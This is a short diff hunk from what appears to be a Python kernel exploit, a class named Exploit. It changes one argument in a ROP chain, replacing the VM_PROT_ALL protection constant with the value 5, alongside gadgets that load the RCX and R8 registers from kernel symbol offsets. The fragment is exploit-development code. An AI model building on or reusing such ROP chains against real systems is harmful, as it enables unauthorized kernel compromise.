@@ -612,7 +612,7 @@ class Exploit():
 
         # RCX = VM_PROT_ALL
         rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(VM_PROT_ALL)
+        rop += p64(5)
 
         # R8 = 1
         rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
